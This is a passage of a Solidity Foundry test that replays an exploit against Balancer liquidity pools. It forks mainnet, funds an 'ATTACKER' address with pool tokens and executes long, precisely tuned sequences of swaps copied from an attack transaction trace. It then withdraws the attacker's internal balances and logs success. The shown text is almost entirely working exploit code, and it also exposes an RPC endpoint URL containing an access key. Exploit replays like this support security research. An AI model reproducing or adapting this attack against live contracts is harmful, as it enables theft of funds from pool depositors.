        swaps[34] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[35] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 200000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[36] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 1187, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[37] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[38] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 140000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[39] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 541, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[40] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[41] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 100000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[42] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 748, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[43] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[44] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 73000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[45] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 31543, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[46] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[47] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 52000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[48] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 6095, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[49] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[50] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 37000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[51] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 5100, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[52] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[53] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 26000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[54] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 1176, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[55] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[56] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 18000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[57] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 325, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[58] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[59] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 13000000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[60] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 716, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[61] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[62] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 9500000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[63] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 20452, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[64] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[65] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 6200000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[66] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 3426, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[67] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[68] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 4400000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[69] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 3335, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[70] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[71] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 3100000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[72] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 1199, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[73] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[74] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 2200000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[75] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 617, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[76] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[77] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 1600000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[78] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 1905, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[79] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[80] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 1100000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[81] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 150, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[82] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[83] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 830000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[84] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 7261, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[85] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[86] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 650000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[87] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 1116, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[88] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[89] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 480000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[90] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 419, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[91] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[92] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 350000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[93] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 764, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[94] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[95] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 250000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[96] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 118, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[97] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[98] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 162000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[99] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 27, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[100] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[101] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 120000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[102] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 38, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[103] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[104] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 90000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[105] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 627, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[106] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[107] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 70000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[108] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 461, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[109] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[110] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 56000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[111] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 176, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[112] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[113] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 40000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[114] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 240, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[115] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[116] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 35000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[117] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 103, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[118] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[119] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 26000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[120] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 152, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[121] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1});
        swaps[122] = ExactSwapData({tokenIn: wstETH, tokenOut: sfrxETH, amount: 22000000000, expectedIn: 0, indexIn: 1, indexOut: 2});
        swaps[123] = ExactSwapData({tokenIn: wstETH, tokenOut: QUAD2_BPT, amount: 10000, expectedIn: 0, indexIn: 1, indexOut: 0});
        swaps[124] = ExactSwapData({tokenIn: sfrxETH, tokenOut: QUAD2_BPT, amount: 10000000, expectedIn: 0, indexIn: 2, indexOut: 0});
        swaps[125] = ExactSwapData({tokenIn: rETH, tokenOut: QUAD2_BPT, amount: 10000000000, expectedIn: 0, indexIn: 3, indexOut: 0});
        swaps[126] = ExactSwapData({tokenIn: wstETH, tokenOut: QUAD2_BPT, amount: 10000000000000, expectedIn: 0, indexIn: 1, indexOut: 0});
        swaps[127] = ExactSwapData({tokenIn: sfrxETH, tokenOut: QUAD2_BPT, amount: 10000000000000000, expectedIn: 0, indexIn: 2, indexOut: 0});
        swaps[128] = ExactSwapData({tokenIn: rETH, tokenOut: QUAD2_BPT, amount: 10000000000000000000, expectedIn: 0, indexIn: 3, indexOut: 0});
        swaps[129] = ExactSwapData({tokenIn: wstETH, tokenOut: QUAD2_BPT, amount: 933385689590387618651, expectedIn: 0, indexIn: 1, indexOut: 0});
        swaps[130] = ExactSwapData({tokenIn: sfrxETH, tokenOut: QUAD2_BPT, amount: 933385689590387618651, expectedIn: 0, indexIn: 2, indexOut: 0});
        swaps[131] = ExactSwapData({tokenIn: rETH, tokenOut: QUAD2_BPT, amount: 933385689590387618651, expectedIn: 0, indexIn: 3, indexOut: 0});

        console.log("Executing swaps...");
        uint256 successCount = 0;
        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_QUAD2, kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn), assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount, userData: ""
            });
            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) { successCount++; } catch {}
        }
        console.log("Swaps executed:", successCount, "/", swaps.length);

        // withdraw manageUserBalance()
        IERC20[] memory internalTokens = new IERC20[](4);
        internalTokens[0] = IERC20(QUAD2_BPT);
        internalTokens[1] = IERC20(wstETH);
        internalTokens[2] = IERC20(sfrxETH);
        internalTokens[3] = IERC20(rETH);
        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);
        console.log("Internal balances:");
        console.log("  BPT:", internalBalances[0] / 1e18, "ETH");
        console.log("  wstETH:", internalBalances[1] / 1e18, "ETH");
        console.log("  sfrxETH:", internalBalances[2] / 1e18, "ETH");
        console.log("  rETH:", internalBalances[3] / 1e18, "ETH");
        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0 || internalBalances[3] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;
            if (internalBalances[3] > 0) opsCount++;
            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;
            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(QUAD2_BPT), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[1] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(wstETH), amount: internalBalances[1], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[2] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(sfrxETH), amount: internalBalances[2], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[3] > 0) ops[opIndex] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(rETH), amount: internalBalances[3], sender: ATTACKER, recipient: payable(ATTACKER)});
            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }
        vm.stopPrank();
        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_QUAD2);
        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("wstETH:", finalBalances[1] / 1e18, "ETH");
        console.log("sfrxETH:", finalBalances[2] / 1e18, "ETH");
        console.log("rETH:", finalBalances[3] / 1e18, "ETH");

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(QUAD2_BPT).balanceOf(ATTACKER) / 1e18);
        console.log("wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("sfrxETH:", IERC20(sfrxETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("rETH:", IERC20(rETH).balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps executed:", successCount);
        console.log("SUCCESS!");
    }

    function testEzEthWethPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        console.log("Pool: ezETH-WETH (0x596192bb6e41...0659)");

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_EZETH);

        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("ezETH:", initialBalances[1] / 1e18, "ETH");
        console.log("WETH:", initialBalances[2] / 1e18, "ETH");

        // Fund attacker with BPT
        deal(ezETH_WETH_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(ezETH_WETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(ezETH).approve(address(VAULT), type(uint256).max);
        WETH.approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // swaps from transaction trace
        ExactSwapData[90] memory swaps;

        swaps[0] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 751157288443127704401, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[1] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 437689641031338129357, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[2] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 7511572884431277044, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[3] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 4376896410313381293, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[4] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 75115728844312770, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[5] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 43768964103133813, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[6] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 751157288443128, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[7] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 437689641031338, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[8] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 7511572884431, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[9] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 4376896410314, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[10] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 75115728845, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[11] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 43768964103, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[12] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 751157288, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[13] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 437689641, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[14] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 7511573, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[15] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 4376896, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[16] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 75116, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[17] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 43769, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[18] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 751, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[19] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 438, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[20] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: ezETH, amount: 8, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[21] = ExactSwapData({ tokenIn: ezETH_WETH_BPT, tokenOut: address(WETH), amount: 5, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[22] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 99999999984, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[23] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[24] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 750000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[25] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 77615, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[26] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[27] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 530000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[28] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 8669, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[29] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[30] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 370000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[31] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 1584, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[32] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[33] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 260000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[34] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 38627, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[35] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[36] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 180000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[37] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 1155, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[38] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[39] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 130000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[40] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 8631, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[41] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[42] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 93000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[43] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 4522665, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[44] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[45] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 69000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[46] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 270181, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[47] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[48] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 49000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[49] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 2413, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[50] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[51] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 35000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[52] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 7331, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[53] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[54] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 25000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[55] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 21243, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[56] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[57] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 17000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[58] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 413, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[59] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[60] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 12000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[61] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 316, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[62] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[63] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 9000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[64] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 3143221574, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[65] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[66] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 6400000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[67] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 44220, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[68] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
